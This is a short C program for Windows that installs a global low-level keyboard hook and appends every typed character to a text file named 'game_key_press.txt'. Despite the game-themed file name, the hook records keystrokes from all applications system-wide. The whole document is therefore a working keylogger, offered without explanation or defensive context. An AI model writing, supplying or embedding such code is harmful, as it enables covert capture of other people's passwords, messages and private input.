#include <stdio.h>
#include <windows.h>

HHOOK hook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
            BYTE keyboardState[256];
            WCHAR unicodeBuffer[5]; // To store the Unicode character
            if (GetKeyboardState(keyboardState)) {
                if (ToUnicode(kbdStruct->vkCode, kbdStruct->scanCode, keyboardState, unicodeBuffer, 4, 0) > 0) {
                    FILE *file = fopen("game_key_press.txt", "a");
                    if (file != NULL) {
                        fwprintf(file, L"Key pressed: %c\n", unicodeBuffer[0]);
                        fclose(file);
                    }
                }
            }
        }
    }
    return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main() {
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL) {
        printf("Failed to set hook\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    return 0;
}
